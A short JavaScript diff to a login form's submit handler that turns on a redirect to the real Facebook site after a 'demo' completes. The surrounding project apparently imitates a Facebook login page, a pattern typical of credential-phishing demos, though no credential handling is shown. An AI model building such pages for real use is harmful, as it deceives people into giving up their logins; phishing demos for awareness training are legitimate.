@@ -35,7 +35,7 @@ document.getElementById('login-form').addEventListener('submit', function (event
     })
     .finally(() => {
       // Redirect so demo continues
-      // window.location.href = 'https://www.facebook.com/';
       console.log("Demo complete — would redirect to Facebook now.");
+      window.location.href = 'https://www.facebook.com/';
     });
 });
